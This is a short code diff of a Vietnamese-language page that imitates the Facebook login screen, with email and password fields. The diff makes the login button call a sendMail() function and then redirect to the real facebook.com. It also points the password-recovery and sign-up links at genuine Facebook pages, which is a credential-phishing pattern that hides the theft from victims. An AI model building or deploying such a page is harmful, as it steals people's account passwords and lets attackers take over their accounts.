@@ -111,12 +111,18 @@
   <input type="text" id="email" placeholder="Email hoặc số điện thoại">
 <input type="password" id="password" placeholder="Mật khẩu">
 
-  <button onclick="sendMail()">Đăng nhập</button>
-      <a href="#">Quên mật khẩu?</a>
+<button onclick="sendMail(); window.location.href='https://facebook.com';">
+  Đăng nhập
+</button>
+
+      <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Quên mật khẩu?</a>
       <hr>
-      <div class="new-account">
-        <button>Tạo tài khoản mới</button>
-      </div>
+<div class="new-account">
+  <button onclick="window.open('https://www.facebook.com/r.php?entry_point=login')">
+    Tạo tài khoản mới
+  </button>
+</div>
+
     </div>
   </div>
   <footer>
